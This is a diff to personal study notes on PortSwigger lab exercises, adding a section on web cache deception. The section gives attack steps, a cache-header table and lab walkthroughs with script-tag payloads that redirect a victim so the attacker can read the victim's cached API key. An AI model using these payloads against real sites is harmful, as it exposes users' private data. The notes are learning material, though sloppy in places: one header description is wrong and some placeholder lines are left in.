@@ -94,7 +94,8 @@
 - Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities [API testing, Web Cache Poison]
 - HTTP request smuggler: scan request smuggling vulnerabilities > right clikc on the a request and click 'Launch smuggle probe', then watch the extension's output pane. [HTTP request smuggler]
 - JWT Editor, JSON Web Token [JWT Attack]
-- Server-Side Prototype Pollution Scanner: identifies server side prototype pollution vulnerabilities  [Prototype pollution]  
+- Server-Side Prototype Pollution Scanner: identifies server side prototype pollution vulnerabilities  [Prototype pollution]
+- Web Cache Deception Scanner [Web Cache Deception]
   
 ## SQL Injection
 **How to detect**     
@@ -1620,9 +1621,58 @@ CONNECT
     https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?passwordResetToken=[YOUR TOKEN]
 
 ## Web cache deception
-d......
+- Web cache deception is a vulnerability that enables an attacker to trick a web cache into storing sensitive, dynamic content  
+- Attacker persuades a victim to visit a malicious URL make an ambiguous request for sensitive content > The cache misinterprets this as a request for a static resource and stores the response > attacker can request the same URL to access the cached response
+- Discrepancies in how the cache and origin server map the URL path to resources can result in web cache deception vulnerabilities
 
-### Web cache deception Lab
+**Constructing a web cache deception attack steps**
+- Identify a target endpoint that returns a dynamic response containing sensitive information (`GET`, `HEAD`, `OPTION`)
+- Identify discrepancy in how the cache and origin server parse the URL path (Map URLs to resource, process delimeter characters, normalize paths)
+- Craft a malicious URL that uses the discrepancy to trick the cache into storing a dynamic response
+- use a cache buster (diff cache key) or Burp extension "Param miner > Settings > Add dynamic cachebuster)
+
+**Cached response**
+| **Header**            | **Description**                                                                                 |
+|-----------------------|-------------------------------------------------------------------------------------------------|
+| **X-Cache: hit**      | The response was served from the cache. |
+| **X-Cache: miss**     | Specifies a date/time after which the cached resource is considered stale. Attackers can alter content, and it will remain poisoned until expiration. |
+| **X-Cache: dynamic**  | The response is not suitable for caching |
+| **X-Cache: refresh**  | The cached content was outdated and needed to be refreshed or revalidated. |
+| **Cache-Control**     | Controls how, and for how long, the resource is cached by browsers and intermediate caches. Misconfiguration (e.g., `public`) can lead to caching sensitive or poisoned responses. |
+
+### Web cache deception Lab (NEW 2025/09)
+- Exploiting **path mapping** for web cache deception
+  - Identify a path mapping discrepancy
+    - 	GET /my-account > repeater > change the path
+        ```
+        1st: /my-account/abc > still receive a response containing your API key
+        2nd: /my-account/abc.js > X-Cache: miss  > resend request > X-Cache: hit
+        ```
+  - Craft an exploit
+    - Body `<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>`
+    - Deliver exploit to victim
+    - Go to the URL that you delivered to carlos in your exploit
+      `https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js`
+  - Notice that the response includes the API key for carlos
+- Exploiting **path delimiters** for web cache deception
+  - Identify path delimiters used by the origin server
+    - GET /my-account > repeater > change the path
+      ```
+      1st: /my-account/abc > 404 not found
+      2nd: /my-accountabc > 404 not found  
+      ```
+   - send to intruder > /my-account§a§bc > Payload settings [Simple list] [delimiters](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) > Under Payload encoding, deselect `URL-encode these characters` > `;`,`?` 200 status
+  - Investigate path delimiter discrepancies
+    - /my-account?abc.js > repeater > no cache
+    - /my-account;abc.js > repeater > X-Cache: miss
+  - Craft an exploit
+    - Body `<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</script>`
+    - Deliver exploit to victim
+    - Go to the URL that you delivered to carlos in your exploit
+      `https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js`
+- dd
+- dd
+- dd
 
 ## WebSockets
 - WebSocket connections are initiated over HTTP and are typically long-lived. essages can be sent in either direction at any time and are not transactional in nature.
